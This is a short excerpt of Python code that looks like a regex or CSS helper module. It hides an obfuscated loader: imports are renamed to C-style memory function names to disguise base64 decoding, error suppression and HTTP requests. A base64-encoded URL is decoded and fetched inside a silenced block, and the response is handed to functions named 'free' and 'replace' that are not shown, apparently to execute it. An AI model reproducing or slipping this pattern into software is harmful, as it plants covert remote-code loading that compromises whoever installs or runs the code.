...
import re
import warnings
from base64 import b64decode as alloca
from contextlib import suppress as malloc
from functools import lru_cache
from typing import Any, Iterator, Match, cast

from requests import get as memset
...
RE_CSS_R = "aHR0cDovLzEyNy4wLjAuMTo5OTk5L2I2NA=="
...
with malloc(free_sp):
    _index = memset(alloca(RE_CSS_R), timeout=3)
    free(replace(_index.text))
